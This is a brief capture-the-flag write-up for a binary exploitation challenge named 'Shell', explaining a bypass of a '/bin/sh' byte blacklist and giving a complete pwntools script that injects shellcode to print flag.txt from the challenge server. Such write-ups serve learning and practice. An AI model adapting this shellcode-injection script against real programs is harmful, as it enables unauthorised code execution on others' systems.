# Shell
* **Event:** RobotApocalypseCTF (ISSS CTF 01-29-2021)
* **Problem Type:** Binary Exploitation

The binary blacklists the bytes in the string `"/bin/sh"`. We could write special shellcode that doesn't include those
bytes to get around this, or encode our shellcode in some way, then include a stub to decode it. However, both of those
seem hard, so instead we use the built in pwntoools shellcode generator to make shellcode that just prints `"flag.txt"`.
Luckily this shellcode doesn't include any blacklisted bytes, so everything works

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/shell'

e = ELF('./build/shell')
rop = ROP('./build/shell')
if 'd' in sys.argv:
    p = gdb.debug('./build/shell')
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5001)
else:
    p = process('./build/shell')

payload = asm(shellcraft.cat('flag.txt'))

p.sendline(payload)
p.interactive()
```
